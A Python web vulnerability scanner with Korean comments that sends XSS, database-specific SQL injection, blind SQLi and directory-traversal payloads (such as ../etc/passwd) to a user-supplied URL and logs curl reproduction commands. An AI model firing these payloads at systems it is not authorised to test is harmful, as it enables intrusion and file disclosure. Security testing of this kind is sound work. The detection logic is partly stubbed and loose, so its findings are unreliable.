import requests
import re
from time import time
from datetime import datetime
import logging
import json
from itertools import combinations  # 사용하지 않으므로 제거 가능, 필요 시 유지

# 로깅 설정
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

def detect_db(response, db_patterns):
    # 외부에서 정의된 함수로 가정 (예: 응답 헤더/텍스트로 DB 유형 탐지)
    return "MySQL"  # 임시 반환값

def load_db_patterns():
    # 외부에서 정의된 함수로 가정
    return {}

def save_db_patterns(db_patterns):
    # 외부에서 정의된 함수로 가정
    pass

class WebVulnTester:
    def __init__(self, target_url, params_info):
        self.target_url = target_url
        self.params_info = params_info.get(target_url, {"method": "GET", "params": {"q": ""}})
        self.payloads = {
            "XSS": [
                '"><script>alert(1)</script>',
                '"><img src=x onerror=alert(1)>',
                '" onmouseover="alert(1)',
                '"><svg onload=alert(1)>',
            ],
            "SQLi": {
                "generic": [
                    "' OR 1=1 --",
                    "' OR '1'='1' --",
                    "1' OR '1'='1",
                    "' AND 1=1 --",
                ],
                "MySQL": [
                    "' UNION SELECT 1, user() --",
                    "' OR 1/0 --",
                    "' AND SUBSTRING((SELECT database()), 1, 1)='m' --",
                    "' AND SUBSTRING((SELECT database()), 1, 1)='z' --",
                ],
                "MSSQL": [
                    "' UNION SELECT 1, @@version --",
                    "' AND 1=CONVERT(int, 'a') --",
                    "' AND SUBSTRING(DB_NAME(), 1, 1)='m' --",
                    "' AND SUBSTRING(DB_NAME(), 1, 1)='z' --",
                ],
                "PostgreSQL": [
                    "' UNION SELECT 1, current_user --",
                    "' AND CAST('a' AS int) --",
                    "' AND SUBSTRING(current_user, 1, 1)='p' --",
                    "' AND SUBSTRING(current_user, 1, 1)='z' --",
                ],
                "Oracle": [
                    "' UNION SELECT 1, USER FROM dual --",
                    "' AND SUBSTR('a', 1/0) IS NOT NULL --",
                    "' AND SUBSTR(USER, 1, 1)='S' --",
                    "' AND SUBSTR(USER, 1, 1)='Z' --",
                ],
                "SQLite": [
                    "' UNION SELECT 1, sqlite_version() --",
                    "' AND SUBSTRING(sqlite_version(), 1, 1)='3' --",
                    "' AND SUBSTRING(sqlite_version(), 1, 1)='9' --",
                ],
                "DB2": [
                    "' UNION SELECT 1, CURRENT USER FROM sysibm.sysdummy1 --",
                    "' AND SUBSTR(CURRENT_SERVER, 1, 1)='D' --",
                    "' AND SUBSTR(CURRENT_SERVER, 1, 1)='Z' --",
                ],
                "MongoDB": [
                    "' || 1==1",
                    "{ $where: '1==1' }",
                ]
            },
            "DT": [
                "../etc/passwd",
                "../../../../../../etc/passwd",
                "..\\..\\..\\windows\\win.ini",
                "C:\\Windows\\win.ini",
            ]
        }
        self.results = []
        self.detected_db = "Unknown"
        self.db_patterns = load_db_patterns()
        self.dynamic_dt_payloads = set()
        self.session = requests.Session()  # 세션 재사용으로 성능 개선

    def format_payload_str(self, payload_dict):
        return "; ".join([f"{k}: {v}" for k, v in payload_dict.items()])

    def test_vulnerability(self, payload_type, payload_dict, method, params_dict):
        try:
            start_time = time()
            if method == "GET":
                response = self.session.get(self.target_url, params=params_dict, timeout=5)
            elif method == "POST":
                response = self.session.post(self.target_url, data=params_dict, timeout=5)
            else:
                return None
            
            response_time = time() - start_time
            response_text = response.text[:500]
            content_type = response.headers.get("Content-Type", "").lower()
            response_size = len(response.text)

            payload_str = self.format_payload_str(payload_dict)
            logging.info(f"Payload: {payload_str} | Type: {payload_type} | Method: {method} | Params: {params_dict} | URL: {self.target_url} | Response Time: {response_time:.2f}s | Status: {response.status_code} | Size: {response_size} | Content-Type: {content_type} | Response Snippet: {response_text}")

            result = None
            if payload_type == "XSS":
                for payload in payload_dict.values():
                    if payload in response.text:
                        result = f"[!] XSS 취약점 발견: {payload_str} (Method: {method}, Params: {params_dict}, URL: {self.target_url})"
                        break
            elif payload_type == "SQLi":
                if any(keyword in response.text.lower() for keyword in ["error", "mysql", "sql", "database", "syntax", "division", "convert", "cast", "benchmark", "version", "user"]):
                    result = f"[!] SQLi 취약점 발견: {payload_str} (Method: {method}, Params: {params_dict}, URL: {self.target_url})"
            elif payload_type == "DT":
                file_patterns = {
                    "passwd": r"root:[x*]:0:0:",
                    "win.ini": r"\[extensions\]",
                }
                if ("text" in content_type or "application/octet-stream" in content_type) and 50 < response_size < 100000:
                    for file, pattern in file_patterns.items():
                        for payload in payload_dict.values():
                            if payload.lower().endswith(file) and re.search(pattern, response.text, re.IGNORECASE):
                                self.extract_dynamic_files(response.text)
                                result = f"[!] Directory Traversal 취약점 발견: {payload_str} (탐지된 파일: {file}, Method: {method}, Params: {params_dict}, URL: {self.target_url})"
                                break
                        if result:
                            break

            if result:
                vuln_data = {
                    "type": payload_type,
                    "payload": payload_str,
                    "false_payload": "",
                    "method": method,
                    "url": self.target_url,
                    "params": json.dumps(params_dict),
                    "status_code": response.status_code,
                    "response_snippet": response_text,
                    "timestamp": datetime.fromtimestamp(time()).strftime('%Y-%m-%d %H:%M:%S'),
                    "reproduce_command": f"curl -X {method} \"{self.target_url}?{'&'.join([f'{k}={v}' for k, v in params_dict.items()])}\" -d \"{'&'.join([f'{k}={v}' for k, v in params_dict.items()])}\"" if method == "POST" else f"curl \"{self.target_url}?{'&'.join([f'{k}={v}' for k, v in params_dict.items()])}\""
                }
                self.results.append(vuln_data)  # self.reproducible_vulns 대신 통합
                return result
            return None
        except requests.Timeout:
            logging.error(f"Timeout for payload {payload_str} at {self.target_url}")
            return None
        except requests.ConnectionError as e:
            logging.error(f"Connection error for payload {payload_str} at {self.target_url}: {e}")
            return None
        except Exception as e:
            logging.error(f"Request failed for payload {payload_str} at {self.target_url} with method {method} and params {params_dict}: {e}")
            return None

    def test_blind_sqli(self, true_payload_dict, false_payload_dict, method, params_true, params_false):
        try:
            if method == "GET":
                true_response = self.session.get(self.target_url, params=params_true, timeout=5)
                false_response = self.session.get(self.target_url, params=params_false, timeout=5)
            elif method == "POST":
                true_response = self.session.post(self.target_url, data=params_true, timeout=5)
                false_response = self.session.post(self.target_url, data=params_false, timeout=5)
            else:
                return None

            true_text = true_response.text[:500]
            true_size = len(true_response.text)
            false_text = false_response.text[:500]
            false_size = len(false_response.text)

            true_payload_str = self.format_payload_str(true_payload_dict)
            false_payload_str = self.format_payload_str(false_payload_dict)
            logging.info(f"Blind SQLi Test | True Payload: {true_payload_str} | Method: {method} | Params: {params_true} | URL: {self.target_url} | Size: {true_size} | Snippet: {true_text}")
            logging.info(f"Blind SQLi Test | False Payload: {false_payload_str} | Method: {method} | Params: {params_false} | URL: {self.target_url} | Size: {false_size} | Snippet: {false_text}")

            if true_text != false_text or abs(true_size - false_size) > 10:
                result = f"[!] Blind SQLi 취약점 발견: {true_payload_str} (vs {false_payload_str}, Method: {method}, Params: {params_true}, URL: {self.target_url})"
                vuln_data = {
                    "type": "Blind SQLi",
                    "payload": true_payload_str,
                    "false_payload": false_payload_str,
                    "method": method,
                    "url": self.target_url,
                    "params": json.dumps(params_true),
                    "status_code": true_response.status_code,
                    "response_snippet": true_text,
                    "timestamp": datetime.fromtimestamp(time()).strftime('%Y-%m-%d %H:%M:%S'),
                    "reproduce_command": f"curl -X {method} \"{self.target_url}?{'&'.join([f'{k}={v}' for k, v in params_true.items()])}\" -d \"{'&'.join([f'{k}={v}' for k, v in params_true.items()])}\"" if method == "POST" else f"curl \"{self.target_url}?{'&'.join([f'{k}={v}' for k, v in params_true.items()])}\""
                }
                self.results.append(vuln_data)
                return result
            return None
        except requests.Timeout:
            logging.error(f"Timeout for Blind SQLi test at {self.target_url}")
            return None
        except requests.ConnectionError as e:
            logging.error(f"Connection error for Blind SQLi test at {self.target_url}: {e}")
            return None
        except Exception as e:
            logging.error(f"Blind SQLi test failed for {true_payload_str} at {self.target_url} with method {method} and params {params_true}: {e}")
            return None

    def extract_dynamic_files(self, response_text):
        file_pattern = r"[\w\-]+\.(php|conf|ini|log|txt|sql|db|bak)"
        dir_pattern = r"[/\\]([\w\-]+)[/\\]"
        
        files = re.findall(file_pattern, response_text, re.IGNORECASE)
        dirs = re.findall(dir_pattern, response_text, re.IGNORECASE)
        
        for file in files:
            for depth in [1, 2, 3]:
                self.dynamic_dt_payloads.add(f"{'../' * depth}{file}")
        
        for dir in dirs:
            for file in ["config.php", "settings.ini", "passwd"]:
                self.dynamic_dt_payloads.add(f"../{dir}/{file}")

        if files or dirs:
            logging.info(f"Dynamic DT detected at {self.target_url} - Files: {files}, Dirs: {dirs}")

    def update_patterns(self, db_name, response_text):
        if db_name not in self.db_patterns:
            self.db_patterns[db_name] = {"text": [], "headers": {}, "errors": []}
        
        words = set(response_text.lower().split())
        for word in words:
            if len(word) > 3 and word not in self.db_patterns[db_name]["text"]:
                self.db_patterns[db_name]["text"].append(word)
        
        if "error" in response_text.lower():
            self.db_patterns[db_name]["errors"].append(response_text.lower().strip()[:100])
        
        save_db_patterns(self.db_patterns)

    def run_tests(self):
        print(f"\n[+] 테스트 시작: {self.target_url}")
        method = self.params_info["method"]
        param_names = list(self.params_info["params"].keys())
        
        if not param_names:
            param_names = ["q"]
            print(f"[!] 파라미터를 찾지 못해 기본값 'q'를 사용합니다: {self.target_url}")

        print(f"[+] 모든 파라미터 {param_names}에 서로 다른 페이로드로 {method} 메서드 테스트 진행 중... ({self.target_url})")
        
        # XSS 테스트
        xss_payloads = self.payloads["XSS"]
        for i in range(len(xss_payloads)):
            params_dict = {}
            payload_dict = {}
            for j, param in enumerate(param_names):
                payload_idx = (i + j) % len(xss_payloads)
                params_dict[param] = xss_payloads[payload_idx]
                payload_dict[param] = xss_payloads[payload_idx]
            result = self.test_vulnerability("XSS", payload_dict, method, params_dict)
            if result:
                print(result)

        # SQLi 테스트
        print(f"[+] 데이터베이스 유형 탐지 중... ({method}, Params: {param_names}, {self.target_url})")
        last_response = None
        generic_payloads = self.payloads["SQLi"]["generic"]
        for i in range(len(generic_payloads)):
            params_dict = {}
            payload_dict = {}
            for j, param in enumerate(param_names):
                payload_idx = (i + j) % len(generic_payloads)
                params_dict[param] = generic_payloads[payload_idx]
                payload_dict[param] = generic_payloads[payload_idx]
            try:
                if method == "GET":
                    response = self.session.get(self.target_url, params=params_dict, timeout=5)
                else:
                    response = self.session.post(self.target_url, data=params_dict, timeout=5)
                self.detected_db = detect_db(response, self.db_patterns)
                last_response = response
                if self.detected_db != "Unknown":
                    print(f"[+] 탐지된 데이터베이스: {self.detected_db} ({method}, Params: {param_names}, {self.target_url})")
                    break
            except requests.RequestException:
                continue

        if self.detected_db == "Unknown" and last_response:
            print(f"[!] 데이터베이스를 탐지하지 못했습니다 ({method}, Params: {param_names}, {self.target_url}).")
            feedback = input("[?] 실제 데이터베이스를 알고 있다면 입력하세요 (예: MySQL, MSSQL, 빈칸으로 스킵): ").strip()
            if feedback and feedback in self.payloads["SQLi"]:
                self.detected_db = feedback
                self.update_patterns(feedback, last_response.text)
                print(f"[+] {feedback} 패턴이 학습되었습니다 ({method}, Params: {param_names}, {self.target_url}).")

        db_key = self.detected_db if self.detected_db in self.payloads["SQLi"] else "generic"
        print(f"[+] {db_key}에 맞는 SQLi 테스트 진행 중... ({method}, Params: {param_names}, {self.target_url})")
        sqli_payloads = self.payloads["SQLi"][db_key]
        for i in range(len(sqli_payloads)):
            params_dict = {}
            payload_dict = {}
            for j, param in enumerate(param_names):
                payload_idx = (i + j) % len(sqli_payloads)
                params_dict[param] = sqli_payloads[payload_idx]
                payload_dict[param] = sqli_payloads[payload_idx]
            result = self.test_vulnerability("SQLi", payload_dict, method, params_dict)
            if result:
                print(result)

        # Blind SQLi 테스트
        print(f"[+] Blind SQLi 테스트 진행 중... ({method}, Params: {param_names}, {self.target_url})")
        blind_payloads = self.payloads["SQLi"][db_key]
        blind_pairs = [(blind_payloads[i], blind_payloads[i+1]) for i in range(0, len(blind_payloads)-1, 2)]  # 명시적 쌍 정의
        if not blind_pairs:
            blind_pairs = [(blind_payloads[0], blind_payloads[-1])] if len(blind_payloads) >= 2 else []
        for true_base, false_base in blind_pairs:
            true_payload_dict = {}
            false_payload_dict = {}
            params_true = {}
            params_false = {}
            for j, param in enumerate(param_names):
                true_idx = j % len(blind_payloads)
                false_idx = (j + 1) % len(blind_payloads)
                true_payload_dict[param] = blind_payloads[true_idx]
                false_payload_dict[param] = blind_payloads[false_idx]
                params_true[param] = blind_payloads[true_idx]
                params_false[param] = blind_payloads[false_idx]
            result = self.test_blind_sqli(true_payload_dict, false_payload_dict, method, params_true, params_false)
            if result:
                print(result)

        # DT 테스트
        print(f"[+] Directory Traversal 테스트 진행 중... ({method}, Params: {param_names}, {self.target_url})")
        dt_payloads = self.payloads["DT"]
        for i in range(len(dt_payloads)):
            params_dict = {}
            payload_dict = {}
            for j, param in enumerate(param_names):
                payload_idx = (i + j) % len(dt_payloads)
                params_dict[param] = dt_payloads[payload_idx]
                payload_dict[param] = dt_payloads[payload_idx]
            result = self.test_vulnerability("DT", payload_dict, method, params_dict)
            if result:
                print(result)

        # 동적 DT 테스트
        if self.dynamic_dt_payloads:
            print(f"[+] 동적 Directory Traversal 테스트 진행 중... ({method}, Params: {param_names}, {self.target_url})")
            dynamic_dt_list = list(self.dynamic_dt_payloads)
            for i in range(len(dynamic_dt_list)):
                params_dict = {}
                payload_dict = {}
                for j, param in enumerate(param_names):
                    payload_idx = (i + j) % len(dynamic_dt_list)
                    params_dict[param] = dynamic_dt_list[payload_idx]
                    payload_dict[param] = dynamic_dt_list[payload_idx]
                result = self.test_vulnerability("DT", payload_dict, method, params_dict)
                if result:
                    print(result)

def main():
    target_url = input("테스트할 URL을 입력하세요: ").strip()
    params_info = {target_url: {"method": "GET", "params": {"id": "", "name": "", "age": ""}}}  # 예시
    tester = WebVulnTester(target_url, params_info)
    tester.run_tests()
    print(f"[+] 모든 취약점 결과가 self.results에 저장되었습니다: {len(tester.results)} 건")

if __name__ == "__main__":
    main()